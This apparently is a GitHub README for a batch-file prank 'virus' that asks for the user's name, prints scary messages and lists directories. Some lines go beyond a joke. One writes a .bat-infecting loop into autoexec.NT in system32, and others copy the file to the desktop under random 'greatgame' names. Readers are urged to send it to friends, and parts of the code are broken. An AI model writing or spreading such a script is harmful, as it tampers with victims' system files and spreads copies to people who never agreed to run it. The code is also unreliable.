# This is quite a lame Virus

### A bit of history

One day, I was chatting with my friend and all of a sudden he started laughing staring at his phone. He was laughing so hard at this meme -

![Virus Alert](https://raw.githubusercontent.com/nafis-fuad/funny-virus/master/virusImg.jpg "Albanian Virus")

We both laughed after that. Then, he jokingly said: 
> Can you do something like this? It'd be great. 

I thought about it for a second and said:

> I think I can do even better.


I got a call from him the next day and he asked me if the virus was ready. Honestly, I had forgotten about that completely. But I said: Ok, I'm gonna mail it to you within an hour.

(Spoiler alert: mailed him in 15 mins.)


### The fun part

This was a fun project for me because I mostly code in Javascript these days. I do know other languages but nowadays I'm coding in Javascript mostly, so it was a good opportunity to flex my muscles on something different.

As he used a pc, and I had no intention to create an executable file for such a simple thing, I knew creating a batch file was the right thing to do.

Before getting into the code, I had to think about the features the virus must have.

#### Features

1. The virus must prompt the user for a name.
2. Use the received name to display a *scary* message.
3. Scare the user to death by showing a matrix. ( Well, maybe not a matrix, just output a few random file name from the file system... )
4. Show another message, saying thank and other scary stuff.
5. Exit and let the user rest in peace.

Note: I'm going to code this in batch but a true scary effect can be achieved using other languages. This is a simple project just for fun.


### The Coding Part

I had to think through the project features a bit before getting started on coding, but finally, I reached the solution.

Here, I'm explaining each block of the code in short.

First, greet the user:
```bat
@echo Master Nafis has already planted a deadly virus named Monster Pubertis on your delicate device.
@echo off
@echo checking your system -----
@echo off
```

Second, ask for the name:
```bat
set /p name="Now please co-operate and enter your sweet name: "
@echo Thank you, %name% , for co-operation. 
```

Third, Show a scary message:
```bat
echo for %%i in ("*.bat") do copy %%i+c:\tmp.bat %%i #*>c:\windows\system32\autoexec.NT
echo VIRUS DETECTED
Pause
@echo Dear %name%, Let's pretend that I'm planting more viruses.
pause
```

Shows the Matrix-like effect by listing out a few directories.

```bat
@echo Now assume that I'm corrupting your file system. And kindly get scared to your bones.
:1
dir /s
copy c:\tmp.bat
c:\document~1\%username%\desktop\greatgame_%random%.bat
```
Note: A true matrix effect can be achieved with a few lines of C# code. 

Finally exits with a message.
```bat
@echo I'm pretty lame to make a few hundred thousand copies of myself so kindly forward me to other devices... 
@echo Press any key to exit.
pause
```
As you see, it's only a few lines of code. I'm writing this documentation for my friend because he asked me to explain how I did it. 

If you're reading this and wanna have fun, then clone the repo or download the zip file to get the virus. You can change the messages just as you want. Tweak it up and send it to friends. If you want support for other OS, send me a pull request.
